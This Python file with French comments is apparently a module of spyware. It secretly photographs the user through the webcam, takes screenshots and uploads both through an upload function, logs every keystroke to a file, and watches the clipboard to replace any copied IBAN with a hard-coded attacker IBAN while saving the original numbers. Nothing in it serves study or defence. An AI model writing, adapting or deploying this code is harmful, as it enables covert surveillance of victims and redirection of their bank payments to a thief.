import main
import pyperclip
import re
import time

start_time = main.time.time()
# Initialisation de la webcam
def webcam():
    # Créer le dossier si nécessaire
    main.os.makedirs(main.destination_folder, exist_ok=True)
    camera = main.cv2.VideoCapture(0)
    if not camera.isOpened():
        print("Erreur: Impossible d'accéder à la webcam.")
    else:
        # Capturer une image
        ret, frame = camera.read()
        if ret:
            # Enregistrer l'image capturée dans un fichier
            timestamp = int(main.time.time())  # Utilise un timestamp pour nommer les fichiers de manière unique
            filename = f"image_capturee_{timestamp}.png"
            main.cv2.imwrite(filename, frame)
            print(f"Image capturée et sauvegardée sous '{filename}'")
            
        else:
            print("Erreur: Impossible de capturer une image.")

    # Libération de la caméra
    camera.release()
    main.uploadServer(filename)

def get_clipboard_content():
    """Recupere le contenu du presse-papiers"""
    root = main.tk.Tk()
    root.withdraw()  # Cache la fenêtre principale
    clipboard_content = root.clipboard_get()  # Récupère le contenu du presse-papiers
    root.destroy()  # Ferme la fenêtre Tkinter
    return clipboard_content

def on_press(key):
    # Fonction pour enregistrer chaque frappe
    try:
        # Écrire la touche pressée dans le fichier
        with open(main.fichier_log, "a") as fichier:
            fichier.write(f"{key.char}")  # Les lettres alphanumériques
    except AttributeError:
        # Écrire la touche spéciale (ex: Espace, Entrée)
        with open(main.fichier_log, "a") as fichier:
            fichier.write(f" [{key}] ")


def capture_ecran():
    # S'assurer que le dossier existe, sinon le créer
    if not main.os.path.exists(main.destination_folder):
        main.os.makedirs(main.destination_folder)

    # Générer un nom de fichier unique avec l'heure actuelle
    nom_fichier = main.datetime.now().strftime("capture_%Y-%m-%d_%H-%M-%S.png")
    chemin_fichier = main.os.path.join(main.destination_folder, nom_fichier)
    
    # Prendre la capture d'écran
    screenshot = main.pyautogui.screenshot()
    
    # Enregistrer la capture d'écran dans le dossier spécifié
    screenshot.save(chemin_fichier)
    print(f"Capture d'écran enregistrée sous : {chemin_fichier}")
    print(nom_fichier)
    main.uploadServer(nom_fichier)


# Expression régulière pour détecter les IBAN
iban_regex = r'\b[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}\b'

# IBAN de remplacement (à personnaliser)
replacement_iban = "FR76 3000 6000 0112 3456 7890 189"

# Fichier où l'IBAN original sera sauvegardé
output_file = "iban_copies.txt"

# Fonction pour détecter et remplacer l'IBAN
def detect_and_replace_iban():
    copied_text = pyperclip.paste()  # Récupération du texte du presse-papier
    found_iban = re.findall(iban_regex, copied_text)  # Recherche d'un IBAN dans le texte copié

    if found_iban:
        modified_text = re.sub(iban_regex, replacement_iban, copied_text)
        pyperclip.copy(modified_text)  # Copier le texte modifié dans le presse-papier
        
        # Enregistrement de chaque IBAN détecté dans un fichier texte
        with open(output_file, "a") as file:
            for iban in found_iban:
                file.write(iban + "\n")
        
        print(f"IBAN détecté et remplacé. L'IBAN original a été sauvegardé dans {output_file}.")
        return True
    return False

def monitor_clipboard():
    previous_text = ""
    try:
        while True:
            current_text = pyperclip.paste()  # Récupération du texte actuel dans le presse-papier
            if current_text != previous_text:  # Si le texte du presse-papier a changé
                if detect_and_replace_iban():  # Remplacer l'IBAN si trouvé
                    previous_text = pyperclip.paste()  # Met à jour le texte précédent pour éviter les doublons
                else:
                    previous_text = current_text
            time.sleep(1)  # Pause d'une seconde entre chaque vérification
    except KeyboardInterrupt:
        print("\nArrêt du programme par l'utilisateur.")

  
def Main():
    while main.time.time() - start_time < 120:
        get_clipboard_content()
        capture_ecran()
        monitor_clipboard()
        webcam()

if __name__ == "__main__":
    Main()